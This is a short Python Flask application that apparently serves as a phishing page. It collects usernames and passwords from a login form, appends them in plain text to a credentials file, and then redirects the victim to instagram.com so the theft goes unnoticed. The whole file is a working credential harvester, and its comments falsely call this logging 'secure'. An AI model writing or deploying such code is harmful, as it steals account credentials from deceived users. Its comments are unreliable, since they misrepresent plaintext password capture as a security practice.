import os
from flask import Flask, render_template, request

app = Flask(__name__)

# Security: Credentials file path is set via environment variable
LOG_FILE_PATH = os.getenv("LOG_FILE_PATH", "credentials.txt")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Save credentials securely
        with open(LOG_FILE_PATH, 'a') as file:
            file.write(f"Username: {username}, Password: {password}\n")

        return "<script>window.location.href='https://www.instagram.com';</script>"

    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 10000)))
